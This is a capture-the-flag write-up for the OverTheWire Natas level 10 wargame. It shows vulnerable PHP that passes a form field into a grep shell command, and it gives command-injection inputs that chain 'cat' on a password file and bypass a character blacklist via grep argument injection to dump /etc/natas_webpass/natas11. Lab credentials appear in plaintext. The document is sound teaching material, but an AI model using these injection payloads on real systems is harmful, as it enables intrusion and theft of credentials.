# Write up

To login in the domain `http://natas10.natas.labs.overthewire.org/` use credentials:

Username: `natas10`<br/>
Password: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

This level is very similar to natas09.

When logging in, we can examine the code and we focus on the given PHP segment:

```php
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

According to the [documentation](https://www.php.net/manual/en/function.passthru.php):

> The `passthru()` function is similar to the `exec()` function in that it executes a command. This function should be used in place of `exec()` or `system()` when the output from the Unix command is binary data which needs to be passed directly back to the browser.

So if we manage to set the value of the variable `$key` to something like <br/>
`"asgasgn0ns3nsasgasgg" dictionary.txt ; cat /etc/natas_webpass/natas10; ls `<br/>
then the resulting function call would be <br/>
`passthru("grep -i "asgasgn0ns3nsasgasgg" dictionary.txt ; cat /etc/natas_webpass/natas10; ls dictionary.txt");`<br/>
which would yield us the password for level10.

However, there is also some sanitization applied in the input by using the `pgrep_match()` function ([documentation](https://www.php.net/manual/en/function.preg-match.php)). Effectively, this checks for characters `;`, `|`, and `&` in the input, preventing us from chaining multiple commands. However, we can still utilize only `grep` in order to get the password since we know where it is stored. If we supply as input<br/>
` -e ".*" /etc/natas_webpass/natas11 `<br/>
in the form, then the resulting function call will be<br/>
`passthru("grep -i  -e ".*" /etc/natas_webpass/natas11 dictionary.txt")`<br/>
which will effectively print <u>all</u> the contents of both files `/etc/natas_webpass/natas11` and `dictionary.txt`.

The webpage has a form which controls the value of `$key` when a non-empty input is provided. Thus, by entering the above input, we are able to get the password for level11, which is `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

So to login in the level11 use the credentials:

Username: `natas11`<br/>
Password: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`
